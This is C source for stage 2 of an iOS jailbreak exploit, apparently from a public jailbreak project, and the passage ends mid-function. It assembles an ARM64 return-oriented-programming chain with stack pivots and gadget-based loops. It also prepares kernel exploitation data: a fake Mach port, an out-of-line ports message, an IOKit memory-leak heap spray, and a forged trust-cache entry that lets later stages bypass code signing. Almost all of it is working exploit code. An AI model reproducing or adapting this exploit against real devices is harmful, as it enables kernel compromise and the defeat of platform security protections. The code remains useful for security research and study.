#include <mach/mach.h>
#include <aio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

#include <shared/iokit.h>
#include <shared/realsym.h>

#include "rop.h"
#include "stage2.h"
#include "stage1.h"


// TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
// get an address of a specific rop variable (basically rop var name to address)
uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
	while (ropvars != NULL) {
		if (!strcmp(name,ropvars->name) && strlen(name) == strlen(ropvars->name)) {
			return ropvars->stage_addr;
		}
		ropvars = ropvars->next;
	}
	LOG("Stage 2 ROP VAR %s not found",name);
	exit(-1);
}
// build the rop chain
// be aware that this has to be keep in sync with build_chain_debug which is really dirty because this means that there can be differences and this sucks when debugging errors
// FIXME: integreate build_chain_debug into build_chain
void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
	// init (get the first gadget from the head of the linked list)
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t buf;
	int offset_delta = 0;
	uint64_t chain_pos = 0;
	// loop through all the gadgets inside of the linked list
	while (next != NULL) {
		// now check the type of the object
		switch (next->type) {
			// if it's a code address it's a code address in the cache so we need to slid it with our new slide
			case CODEADDR:
				buf = next->value; // get the unslid address
				// slid it to the new address
				// we add and then subtract cause otherwise this could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				// write it to the output/stack
				write(fd,&buf,8);
				// increase the chain position so that we know where we are for the offset types
				chain_pos += 8;
				break;
			// if it's an offset it's a absoult offset from the base of our stack
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base + offset_delta;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			// if it's a relativ offset it's relativ to our current position so we need to add chain_pos
			case REL_OFFSET:
				buf = next->value + chain_pos + offsets->stage2_base;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			// if it's static we will just write it onto the stack
			case STATIC:
				buf = next->value;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			// if it's a buf we will write the whole buf onto the stack and then ajust the offsets to it
			// tbh yeah my implementation of this is really weird because I only ajust OFFSETS to the difference introduced by the BUF but not relativ offsets
			// I guess I never had a case where a BUF would affect a relativ offset and even if it's pretty hard to know if a relativ offset is influence by a BUF rop opcode so I just left it out prob
			case BUF:
				write(fd,(void*)next->value,next->second_val);
				offset_delta += next->second_val;
				chain_pos += next->second_val;
				break;
			// when we insert a barrier we will fill up the current rop stack to the address specified in BARRIER
			case BARRIER:
				// first check if we have enough space
				if (chain_pos > next->value) {
					LOG("not enought space to place barrier");
					exit(1);
				}
				// calc the diff
				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
				// updated the vars
				chain_pos += diff;
				offset_delta += diff;
				// write out the diff (TODO: because BARRIERS bufs are usually pretty large we should prob write this in chunks so that we don't malloc that much data)
				char * tmp = malloc(diff);
				write(fd,tmp,diff);
				free(tmp);
				break;
			// we detected a rop variable so we need to get it's address and put it on the stack
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			// we detected a loop start, this is will also handle the ROP_LOOP_BREAK code because the start of the loop has to be known for that so it's pretty complex
			case ROP_LOOP_START:
				{
				// get the name of the current loop
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain (we will basically precalc this for later use)
				int chain_per_break = 0;
				int chain_for_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8; // * 8 to get the number of bytes
						chain_for_loop_end = chain_per_break*2; // we have two calls for end (mmap and stack pivot)
						chain_per_break += 36*8; // add the if monster below (THERE IS A CHAIN BELOW AND YOU NEED TO ADD IT'S LENGTH HERE SO IF YOU MODIFIY THE CHAIN BELOW YOU NEED TO KEEP THIS IN SYNC!!!)
				}
				// get the size of the full loop and perform some checks
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					// we found the end of the loop add the chain we will add at the end and exit the lookahead
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_for_loop_end;break;}
					// we found a break in the loop so we need to add the size of the break chain we will insert later
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;} // just a normal gadget (XXX: this might acc be bad when we add a buffer there, because we don't account for it's size)
					if (lookahead_gadget->type == ROP_LOOP_START) {LOG("inner loops aren't supported atm");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				// if we didn't found an end we also need to return an error
				if (lookahead_gadget == NULL) {LOG("Loop start without an end!");exit(1);}

				// remove the start loop gadget from the chain
				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;

			
				// for this section the file (stage 2) and the rop gadget chain will be out of sync because we will replace the ROP_LOOP_* gadgets with our own chains below so we need to keep track of the diff
				uint64_t chain_start = chain_pos + offsets->stage2_base;
				uint64_t chain_start_in_file = chain_pos;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = chain_pos;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						
						// mmap the file back over the loop
						// the rounding is there to make sure that we always mmap the whole loop
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						ADD_COMMENT("restore the loop stack");
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED | MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
			
						// stack pivot back up to the start of the loop after the mmap
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (nop/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the nop and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ // this will misalign the stack if x0 is none zero (see the nonezero/zero comments below)
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	

					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonezero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8)/*the call below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */ // 0 chain basically calls beast gadget here which will then clal x27 (0) so the stack pivot which will use x24 to pivot behind all of this
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
						
						// pivot the stack to where we want it (we basically pivot over this call if x0 is 0 otherwise we will hit it and then pivot out of the loop)
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else {lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				continue; // we have to handle the current gadget again, cause we overwrote it
				}
				break;
			// ROP_LOOP_BREAK is handled inside of LOOP_START and gets replaced there so if we would find another one it is outside of a loop and because of this we need to report an error
			case ROP_LOOP_BREAK:
				LOG("ROP_LOOP_BREAK OUTSIDE OF A LOOP");
				exit(1);
				break;
			// ROP_LOOP_END is already handled in ROP_LOOP_START
			case ROP_LOOP_END:
				break;
			// default is just a NOP case (TODO: in theory we should be able to replace this with the nop case and error on default/no value set but this should also be fine so yeah idc atm)
			default:
				buf = 0;
				write(fd,&buf,8);
				chain_pos += 8;
		}
		prev_gadget = next;
		next = next->next;
	}
	// make sure that stage2 is always large enough (XXX: shouldn't it be 0x4000 for userland on iOS?)
	offsets->stage2_size = chain_pos + 0x1000;
}
// uses dlsym to get an address of a symbol and then return it's unslid value
uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
	uint64_t sym = (uint64_t)dlsym(RTLD_DEFAULT,name);
	if (sym == 0) {LOG("symbol (%s) not found",name);exit(1);}
	uint64_t cache_addr = 0;
	syscall(294, &cache_addr); // get the current slid cache address
	// unslide the ptr returned by dlsym
	sym += 0x180000000;
	sym -= cache_addr;
	return sym;
}
#ifndef RELEASE
// this is here to add comments on some args so that you can read the rop stack in a better way (basically explains you which regs loads from the BEAST gadget are arguments and which of them is the stack pivot)
char * pos_description_DBG(int pos, int longjmp_buf) {
	char * buf = malloc(100);
	memset(buf,0,100);
	if (longjmp_buf) {
		if (pos == 13) {
			snprintf(buf,100,"stack pivots here");
		}
		return buf;
	} 
	if (pos >= 5 && pos <= 13) {
		int arg = pos-4;
		if (arg == 6) {arg = 7;}
		else if (arg == 7) {arg = 6;}
		snprintf(buf,100,"ARG %d",arg);
	}
	return buf;
} 

// this is the function that will build that chain on none release builds (FIXME: we should merge both of them otherwise there might be implementation differences)
// this is basically the same as the one above just being a bit more verbose so that I was able to identify errors in the framework/rop stack more easily so make sure you understand the one above then you should be able ot understand this one as well
// JUST MAKE SURE TO KEEP BOTH IN SYNC IF YOU CHANGE STUFF OTHERWISE SHIT WILL HIT THE FAN
void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t current_addr = offsets->stage2_base;
	uint64_t buf;
	int offset_delta = 0;
	int longjmp_buf = 1;
	int pos = 0;
	char * pos_buf = NULL;
	LOG("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm",offsets->stage2_base);
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				buf = next->value;
				// we add and then we subtract otherwise it could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (code address org:%llx) ",buf,next->value);
				if (next->value == offsets->BEAST_GADGET) {
					printf("Beast gadget (x30)\n");
					printf("=\n");
					pos = 0;
				}else if (next->value == offsets->BEAST_GADGET_LOADER) {
					printf("Beast gadget loader (x30)\n");
				}else if (next->value == offsets->str_x0_gadget) {
					printf("return val (x0) storing gadget (ARG 8) is the address where we will store to\n");
				}else if (next->value == offsets->memcpy) {
					printf("memcpy\n");
				}else{
					printf("normal call if you want to know what this is you have to check your offset struct\n");
				}
				current_addr += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base+ offset_delta;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case REL_OFFSET:
				buf = next->value + current_addr;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case STATIC:
				buf = next->value;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (static) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case BUF:
				offset_delta += next->second_val;
				current_addr += next->second_val;
				printf("BUFFER INSERTED HERE size: 0x%x spans to 0x%llx\n",next->second_val,current_addr);
				longjmp_buf = 0;
				pos = 0;
				break;
			case BARRIER:
				if (current_addr > next->value) {
					printf("not enought space to place barrier\n");
					exit(1);
				}
				uint64_t diff = next->value - current_addr;
				current_addr += diff;
				offset_delta += diff;
				printf("ADDED BARRIER HERE size: 0x%llx spans to 0x%llx\n",diff,current_addr);
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (variable) (%s realaddr: %llx) %s\n",buf,(char*)next->value,buf-next->second_val,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case ROP_LOOP_START:
				{
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain
				int chain_per_break = 0;
				int chain_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8;
						chain_loop_end = chain_per_break*2; // two calls for end
						chain_per_break += 36*8; // add the if monster chain from below
				}
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_loop_end; break;}
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;}
					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}

				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;
				uint64_t chain_start = current_addr;
				uint64_t chain_start_in_file = current_addr-offsets->stage2_base;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = (current_addr-offsets->stage2_base)/8;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						
						ADD_COMMENT("restore the loop stack");
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED|MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
						
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;

						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8) /*the call below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */

						
						ADD_COMMENT("stack pivot mov sp,x2");
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else{lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				printf("ADDED LOOP WITH SIZE %d starting at 0x%llx\n",loop_size,chain_start);
				continue; // we have to handle the current gadget again, cause we overwrote it
				}
			case ROP_LOOP_BREAK:
				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
				exit(1);
				break;
			case ROP_LOOP_END:
				break;
			default:
				buf = 0;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (NOP)\n",buf);
				pos++;
				current_addr += 8;
				break;
		}
		if (next->comment != NULL) {
			printf("COMMENT(line: %llu): ",next->comment->line);
			puts(next->comment->comment);
		}
		prev_gadget = next;
		next = next->next;
	}
	printf("===\n");
}
#endif

// this builds the stage 2 data buffer from all the rop variables
void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
	// get the buffer pointer to mem (this will get preallocated FIXME: we should precalc the size and then do the allocation because this might overflow (code below will catch this condition but still not good pratice))
	void * buf_pointer = offsets->stage2_databuffer;
	// check where the start address of the data buffer should be
	uint64_t buf_in_stage = offsets->stage2_base;
	uint32_t buffer_size = 0;
	buf_in_stage += 22*8; // jump over the longjmp we have at the start of the buffer
	rop_var_t * current_var = ropvars;
	while (current_var != NULL) {
		uint64_t real_size = current_var->size;
		current_var->size += 8-(current_var->size % 8); // align
		buffer_size += current_var->size;
		if (buffer_size > offsets->stage2_databuffer_len) {
			LOG("STAGE 3, DATABUFFER TO SMALL");
			exit(-1);
		}
		// copy the variable into the buffer
		memcpy(buf_pointer,current_var->buffer,real_size);
		current_var->stage_addr = buf_in_stage;
		buf_pointer += current_var->size;
		buf_in_stage += current_var->size;
		current_var = current_var->next;
	}
}

void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir) {

	// TODO: the stage2_databuffer_len should be set in install.m
	offsets->stage2_databuffer_len = 0x10000;
	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);
	memset(offsets->stage2_databuffer,0,offsets->stage2_databuffer_len); // make sure everything is inited to 0

	// let's go
	INIT_FRAMEWORK(offsets);

	// macro to call functions by their name
#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	ADD_COMMENT(name); \
	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);

	// tmp buffer used for all the rop vars that are 0 anyway (FIXME: this should be done with a flag in the rop var struct specifing that we just want to have this space in the databuffer and didn't supply our own buffer)
	char * tmp = malloc(0x2000);
	memset(tmp,0,0x2000);

	// fixup errno (comment that out if you want to debug as in to check if an open syscall or sth like that fails because it will cause an access violation, it needs to be here tho because the racer syscall will sometimes fail when we exhause the job queue)
	// map the memory it uses
	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);

	// this is here to fix a crash in mach_msg tho I have no idea what is accessed there, just mapping the page gets it running tho
	CALL("__mmap",offsets->mach_msg_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);

	// SETUP VARS
	// FIXME: replace tmp with NULL and let the framework handle it
	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); // flag that tells the racer thread if it should still race or not
	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
	DEFINE_ROP_VAR("desc_addr",8,tmp); // pointer to the port buffer

	// build the first ool_message
	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
	memset(ool_message,0,sizeof(ool_message_struct));
	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    ool_message->head.msgh_local_port = MACH_PORT_NULL;
    ool_message->head.msgh_size = (unsigned int)sizeof(ool_message_struct) - 2048;
    ool_message->msgh_body.msgh_descriptor_count = 1;
    ool_message->desc[0].count = 1; // will still go to kalloc.16 but we don't have another point of failture (the other point of failture will be another pointer to a port, because we reallocate this the kernel might use it before we got the full reallocation so we didn't overwrote the whole struct and that's why I use 1 instead of 2 here)
    ool_message->desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_message->desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;

	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel

	SET_ROP_VAR64_TO_VAR_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc[0].address),"tmp_port",0);

	// setup the fake port we will place in userland here (this would need to go into the sysctl buffer and you would need to call the sysctl on each change to it on SMAP devices)
	kport_t * fakeport = malloc(sizeof(kport_t));
	memset((void*)fakeport,0,sizeof(kport_t));
	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
	fakeport->ip_references = 100;
	fakeport->ip_lock.type = 0x11;
	fakeport->ip_messages.port.receiver_name = 1;
	fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_srights = 99;

	DEFINE_ROP_VAR("fakeport",sizeof(kport_t),fakeport); // the userland port

	DEFINE_ROP_VAR("service",sizeof(io_service_t),tmp); // RootDomain Service
	DEFINE_ROP_VAR("client",sizeof(io_connect_t),tmp); // RootDomainUC

	// the dict we will spray using the root domain mem leak
	uint32_t raw_dict[] = {
		kOSSerializeMagic,
		kOSSerializeEndCollection | kOSSerializeData | 0x10,
		0xaaaaaaaa,
		0xbbbbbbbb,
		0x00000000,
		0x00000000,
	};

	// the message we will send to the port of the rootdomainuserclient to trigger the vulnerable code path
	MEMLEAK_Request * memleak_msg = malloc(sizeof(MEMLEAK_msg));
	memset(memleak_msg,0,sizeof(MEMLEAK_msg));
	memleak_msg->NDR = NDR_record;
	memleak_msg->selector = 7; // right method
	memleak_msg->scalar_inputCnt = 0;
	memleak_msg->inband_inputCnt = 24; /*sizeof raw_dict*/
	memcpy(&memleak_msg->inband_input,&raw_dict,24); // we can pass the dict inband because it's small enough
	memleak_msg->ool_input_size = 0;
	memleak_msg->ool_input = (mach_vm_address_t)NULL;
	memleak_msg->inband_outputCnt = 0;
	memleak_msg->scalar_outputCnt = 0;
	memleak_msg->ool_output = 0;
	memleak_msg->ool_output_size = 0;
	memleak_msg->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	memleak_msg->Head.msgh_id = 2865;
	memleak_msg->Head.msgh_reserved = 0;


	DEFINE_ROP_VAR("memleak_msg",sizeof(MEMLEAK_msg),memleak_msg);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,inband_input) + 2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport (for the SMAP implemention you would need to leak the kernel slide before (implement the bug from panicall above) and then write the address of the sysctl buffer here)

	// our own port
	DEFINE_ROP_VAR("self",sizeof(mach_port_t),tmp);


	// setup new trustcache struct
	// TODO: move that into a seperate file
	// FIXME: get the hash at runtime
	typedef char hash_t[20];
	struct trust_chain {
		uint64_t next;
		unsigned char uuid[16];
		unsigned int count;
		hash_t hash[2];
	};
	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
	memset(new_entry,0,sizeof(struct trust_chain));
	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
	new_entry->count = 2;
	// YOU NEED TO UPDATE THESE TWO HASHES WHEN YOU RECOMPILE STAGE 3 OR STAGE 4 respectivly
	hash_t my_dylib_hash = {0x1b,0x99,0xa5,0x2e,0x73,0x82,0x43,0x79,0x66,0x16,0x4a,0x39,0x65,0x96,0xcc,0x5e,0x71,0xac,0x74,0xe5}; // stage 3 hash
	hash_t my_binary_hash = {0xb0,0xc0,0xab,0xc1,0x8b,0x05,0x5b,0x89,0x55,0x3f,0x48,0x57,0xde,0x35,0x5f,0xaf,0x20,0x5a,0x3f,0xe6}; // stage 4 hash
	memcpy(&new_entry->hash[0],my_dylib_hash,20);
	memcpy(&new_entry->hash[1],my_binary_hash,20);
	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);

	// path to stage 3 (you need to make sure that this is reachable from racoons sandbox)
